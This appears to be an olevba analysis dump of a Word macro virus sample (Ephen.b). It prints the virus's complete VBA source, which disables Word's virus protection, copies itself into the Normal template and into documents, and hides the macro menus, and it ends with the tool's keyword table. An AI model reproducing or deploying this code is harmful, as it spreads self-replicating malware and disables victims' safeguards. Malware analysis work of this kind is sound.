olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ephen.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ephen.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO anjing.bas 
in file: Virus.MSWord.Ephen.b - OLE stream: 'Macros/VBA/anjing'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
' bagabs by ephen 01/31/98
' On Error GoTo bagabs

WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
GlobalDoc = NormalTemplate
GlobalInstalled = False

For f = 1 To NormalTemplate.VBProject.VBComponents.Count
  If NormalTemplate.VBProject.VBComponents(f).Name = "bagabs" Then
     NormalTemplate.VBProject.VBComponents.Remove NormalTemplate.VBProject.VBComponents.Item(f)
     If NormalTemplate.Saved = False Then
        NormalTemplate.Save
     End If
  End If
Next
For f = 1 To NormalTemplate.VBProject.VBComponents.Count
  If NormalTemplate.VBProject.VBComponents(f).Name = "Anjing" Then
    GlobalInstalled = True
  End If
Next


If GlobalInstalled = False Then
  Application.OrganizerCopy _
    Source:=ActiveDocument.FullName, _
    Destination:=NormalTemplate.FullName, _
    Name:="Anjing", _
    Object:=wdOrganizerObjectProjectItems
  Options.SaveNormalPrompt = False
  CommandBars("Tools").Controls("Macro").Enabled = False
  For s = 13 To 16
    CommandBars("Tools").Controls(s).Enabled = False
  Next
End If

If Day(Now()) = 5 And Month(Now()) = 7 Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "Praise the Lord ! Now and forever . . ." + Chr(13) + Chr(13) + _
                "Thank's for Your blessing in all my life . . ."
        .Heading = "ephen"
        .Animation = 102
        .Show
    End With
End If

If Day(Now()) = 5 And Month(Now()) = 8 Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "When Someone's born someone dies . . ." + Chr(13) + Chr(13) + _
                "if nobody dies, kill them . . ."
        .Heading = "Message from Grace"
        .Animation = 102
        .Show
    End With
End If

If Day(Now()) = 6 And Month(Now()) = 8 Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "When Someone's born someone dies . . ." + Chr(13) + Chr(13) + _
                "if nobody dies, kill them . . ."
        .Heading = "Message from Grace Maringka"
        .Animation = 102
        .Show
    End With
End If

If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "Minahasa:" + Chr(13) + "  Si Tou Timou Tumou Tou..." + Chr(13) + Chr(13) + _
        "bukang" + Chr(13) + "       Si Tou Timou Tumongko' Tou..."
        .Heading = "bagabs manguni"
        .Animation = 114
        .Show
    End With
End If
If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "Anti Anjing" + Chr(13) + Chr(13) + "    piara sendiri tu anjing . . ."
        .Heading = "Anti anjing"
        .Animation = 116
        .Show
    End With
End If

bagabs:
End Sub
Sub AutoClose()
' bagabs by ephen 01/31/98
On Error GoTo bagabs

WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
ActiveDoc = ActiveDocument
DocumentInstalled = False

For m = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents(m).Name = "bagabs" Then
    ' DocumentInstalled = True
     ActiveDocument.VBProject.VBComponents.Remove ActiveDocument.VBProject.VBComponents.Item(m)
  End If
Next

For m = 1 To ActiveDocument.VBProject.VBComponents.Count
  If ActiveDocument.VBProject.VBComponents(m).Name = "Anjing" Then
    DocumentInstalled = True
  End If
Next

If DocumentInstalled = False Then
  Application.OrganizerCopy _
    Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument.FullName, _
    Name:="Anjing", _
    Object:=wdOrganizerObjectProjectItems
End If

If Day(Now()) = 5 And Month(Now()) = 7 Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "Thank's 4 your attention . . ." + Chr(13) + Chr(13) + ". . . In My Day!"
        .Heading = "ephen"
        .Animation = 102
        .Show
    End With
End If

If WeekDay(Now()) = Int(Rnd() * 7 + 1) Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "Anti Potas" + Chr(13) + Chr(13) + "    piara bae-bae tu anjing . . ."
        .Heading = "bagabs manguni"
        .Animation = 116
        .Show
    End With
End If

If Day(Now()) = 5 And Month(Now()) = 8 Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "When Someone's born someone dies . . ." + Chr(13) + Chr(13) + _
                "if nobody dies, kill anyone . . ."
        .Heading = "Message from Girl"
        .Animation = 102
        .Show
    End With
End If

If Day(Now()) = 6 And Month(Now()) = 8 Then
    With Assistant.NewBalloon
        .Icon = msoIconTip
        .Text = "When Someone's born someone dies . . ." + Chr(13) + Chr(13) + _
                "if nobody dies, kill someone . . ."
        .Heading = "Message from girl"
        .Animation = 102
        .Show
    End With
End If
bagabs:
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

